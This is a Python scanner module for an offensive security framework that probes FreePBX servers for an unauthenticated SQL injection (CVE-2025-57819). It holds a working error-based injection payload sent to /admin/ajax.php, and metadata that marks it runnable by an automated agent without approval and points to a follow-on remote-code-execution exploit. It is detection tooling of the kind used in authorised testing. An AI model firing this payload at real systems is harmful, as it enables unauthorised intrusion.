#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FreePBX Endpoint Manager unauth SQLi (CVE-2025-57819)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_EXTRACTVALUE_PROBE = "x' AND EXTRACTVALUE(1,CONCAT('~',(SELECT USER()),'~')) -- -"
_AJAX_MODULE = 'FreePBX\\modules\\endpoint\\ajax'


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FreePBX - Unauth SQLi Detection (CVE-2025-57819)',
        'description': (
            'Detects CVE-2025-57819 via error-based SQL injection on /admin/ajax.php '
            '(brand parameter, Endpoint Manager module). Confirms MySQL XPATH error '
            'leaking freepbxuser. Full RCE requires stacked-query cron_jobs injection.'
        ),
        'author': ['K3ysTr0K3R (Jared Brits)', 'KittySploit Team'],
        'severity': 'critical',
        'cve': 'CVE-2025-57819',
        'tags': [
            'web', 'scanner', 'cve', 'cve2025', 'freepbx', 'sangoma', 'sqli',
            'unauth', 'rce', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'tech_hints_any': ['freepbx', 'sangoma'],
                'endpoint_pattern_any': ['/admin/ajax.php'],
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'rce', 'from_detail': 'stacked SQLi cron_jobs'},
                ],
                'suggested_followups': [
                    'exploits/unix/webapp/http/freepbx_cve_2025_57819_rce',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-57819',
            'https://github.com/FreePBX/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h',
            'https://www.exploit-db.com/exploits/52681',
        ],
    }

    port = OptPort(80, 'FreePBX HTTP port', True)
    ssl = OptBool(False, 'Use HTTPS', True, advanced=True)

    def run(self):
        base = (self.path or '/').rstrip('/')
        path = f'{base}/admin/ajax.php'
        response = self.http_request(
            method='GET',
            path=path,
            params={
                'module': _AJAX_MODULE,
                'command': 'model',
                'template': 'x',
                'model': 'model',
                'brand': _EXTRACTVALUE_PROBE,
            },
            allow_redirects=False,
        )
        if not response:
            return False
        body = response.text or ''
        if 'XPATH syntax error' not in body or 'freepbxuser' not in body:
            return False
        self.set_info(
            severity='critical',
            cve='CVE-2025-57819',
            reason='FreePBX Endpoint Manager SQLi confirmed (freepbxuser via EXTRACTVALUE)',
            path=path,
            confidence='high',
        )
        return True
